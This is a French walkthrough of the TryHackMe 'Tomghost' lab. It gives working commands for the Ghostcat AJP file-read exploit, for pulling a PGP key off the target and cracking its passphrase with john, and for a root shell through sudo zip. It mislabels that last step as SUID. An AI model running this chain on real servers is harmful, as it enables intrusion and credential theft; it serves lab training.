# TryHackMe: Tomghost 

> **Objectif :** démontrer pas à pas l’exploitation de la vulnérabilité **Ghostcat** (CVE-2020-1938) sur Apache Tomcat, puis élever les privilèges jusqu’au root en déchiffrant une archive PGP et en abusant d’un binaire SUID.  

---

## 1. Reconnaissance réseau

### 1.1 Scan Nmap

```bash
nmap -p- -sV -A 10.10.197.181
```

| Port | Service | Version             | Intérêt                         |
|------|---------|---------------------|---------------------------------|
| 22   | SSH     | OpenSSH 7.2p2       | Accès distant (à garder en tête)|
| 53   | DNS     | **tcpwrapped**      | Non exploité ici                |
| 8009 | AJP13   | Apache JServ 1.3    | **Vecteur Ghostcat**            |
| 8080 | HTTP    | Apache Tomcat 9.0.30| Interface Web par défaut        |

> Ghostcat s’appuie sur le port **AJP 8009** par défaut ; le scanner confirme que le service est exposé.

---

## 2. Analyse du serveur Tomcat

### 2.1 Page d’accueil

Accéder à : `http://10.10.197.181:8080`: la page d’accueil par défaut d’Apache Tomcat affiche la version **9.0.30**.

### 2.2 Recherche de vulnérabilité

Une recherche rapide « tomcat 9.0.30 ghostcat » renvoie la CVE-2020-1938 et l’article Tenable :  
<https://www.tenable.com/blog/cve-2020-1938-ghostcat-…>

---

## 3. Exploitation Ghostcat

### 3.1 Récupération de l’exploit

```bash
git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487
cd Ghostcat-CNVD-2020-10487
```

### 3.2 Lecture du fichier *web.xml*

```bash
python3 ajpShooter.py http://10.10.197.181 8009 /WEB-INF/web.xml read
```

Sortie pertinente :

```
...
Welcome to GhostCat
skyfuck:***********************
```

> Le couple `skyfuck:<mot_de_passe>` apparaît dans la balise `<description>` : **identifiants SSH** récupérés directement depuis le code XML.

---

## 4. Connexion SSH et premier flag

```bash
ssh skyfuck@10.10.197.181
# mot de passe récupéré plus haut
```

Arborescence :

```
credential.pgp      # archive chiffrée
tryhackme.asc       # clé privée PGP
```

Le flag *user* se trouve dans le home d’un autre utilisateur :

```bash
find / -name user.txt 2>/dev/null
cat /home/merlin/user.txt
```

---

## 5. Escalade : de *skyfuck* à *merlin*

### 5.1 Importer la clé ASC

```bash
gpg --import tryhackme.asc
```

### 5.2 Déchiffrer ? GPG demande une **passphrase inconnue**.

---

## 6. Extraction de la passphrase (côté attaquant)

1. **Exfiltrer** `tryhackme.asc` :

   ```bash
   # cible
   python3 -m http.server 8000
   # attaquant
   wget http://10.10.197.181:8000/tryhackme.asc
   ```

2. **Convertir en hash John** :

   ```bash
   gpg2john tryhackme.asc > mdp
   ```

3. **Craquer la passphrase** (rockyou) :

   ```bash
   john mdp --wordlist=/usr/share/wordlists/rockyou.txt
   ```

   Sortie : `********** (passphrase pour déchiffrer la clé PGP !!)`

---

## 7. Déchiffrement de `credential.pgp`

```bash
gpg --decrypt credential.pgp     # saisir la passphrase trouvée
```

Contenu :

```
merlin:<mot_de_passe_merlin>
```

Changement d’utilisateur :

```bash
su merlin
```

---

## 8. Escalade root via *zip* SUID

### 8.1 Vérifier les droits

```bash
sudo -l
# => (root) NOPASSWD: /usr/bin/zip
```

### 8.2 Exploitation (méthode GTFOBins)

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

Une shell root s’ouvre :

```bash
whoami   # root
cat /root/root.txt
```

---

## 9. Récapitulatif des phases

| Phase | Technique | Élément gagné |
|-------|-----------|---------------|
| 1     | Scan Nmap | Découverte AJP 8009 |
| 2     | Ghostcat  | Credentials *skyfuck* |
| 3     | SSH       | Accès utilisateur & fichiers PGP |
| 4     | gpg2john  | Passphrase clé privée |
| 5     | GPG decrypt | Credentials *merlin* |
| 6     | SUID zip  | Root shell & flag |

---

## 10. Points clés à retenir

1. **Ghostcat** → pensez AJP, pas seulement HTTP.  
2. Un couple **.asc + .pgp** ≠ inutile : exploitable via *gpg2john*.  
3. Les **GTFOBins** sont incontournables pour exploiter rapidement un binaire SUID.

---

### Références

- CVE-2020-1938 : <https://www.tenable.com/blog/cve-2020-1938-ghostcat…>  
- Exploit Ghostcat : <https://github.com/00theway/Ghostcat-CNVD-2020-10487>  
- gpg2john : <https://github.com/openwall/john>  
- GTFOBins ZIP : <https://gtfobins.github.io/gtfobins/zip/>

---

**Auteur :** Saad Idrissi
